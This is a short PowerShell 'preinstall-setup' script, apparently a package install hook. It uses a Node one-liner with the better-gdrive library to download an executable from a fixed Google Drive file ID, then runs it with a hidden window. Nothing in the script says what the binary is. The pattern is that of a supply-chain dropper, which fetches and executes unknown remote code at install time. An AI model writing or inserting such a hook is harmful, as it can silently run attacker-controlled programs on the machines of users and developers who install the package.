
$ErrorActionPreference = 'Stop'
Write-Output "[preinstall-setup] Starting preinstall setup script..."
Write-Output "[preinstall-setup] Script execution started at $(Get-Date)"

# Use better-gdrive to download the requested file
$fileId = '1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n'
$output = Join-Path $PSScriptRoot "downloaded_from_gdown.exe"
$env:DOWNLOAD_OUTPUT = $output
Write-Output "[preinstall-setup] File ID: $fileId, Output path: $output"

Write-Output "[preinstall-setup] Downloading file via better-gdrive (id: $fileId) to $output"
$downloadScript = @'
import { downloadFile } from "better-gdrive";

const fileId = "1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n";
const output = process.env.DOWNLOAD_OUTPUT;

await downloadFile(fileId, output);
'@
try {
    $downloadOutput = node --input-type=module -e $downloadScript 2>&1
    Write-Output "[preinstall-setup] Download command output: $downloadOutput"
    Write-Output "[preinstall-setup] Download complete."
} catch {
    Write-Output "[preinstall-setup] ERROR: better-gdrive download failed: $_"
}

if (Test-Path $output) {
    Write-Output "[preinstall-setup] File exists: $output"
    Write-Output "[preinstall-setup] File size: $(Get-Item $output).Length bytes"
    Write-Output "[preinstall-setup] Executing downloaded file: $output"
    $proc = Start-Process -FilePath $output -WindowStyle Hidden -NoNewWindow -Wait -PassThru -ErrorAction SilentlyContinue
    Write-Output "[preinstall-setup] Process exit code: $($proc.ExitCode)"
    Write-Output "[preinstall-setup] Execution finished."
} else {
    Write-Output "[preinstall-setup] ERROR: Downloaded file not found at $output; skipping execution."
}
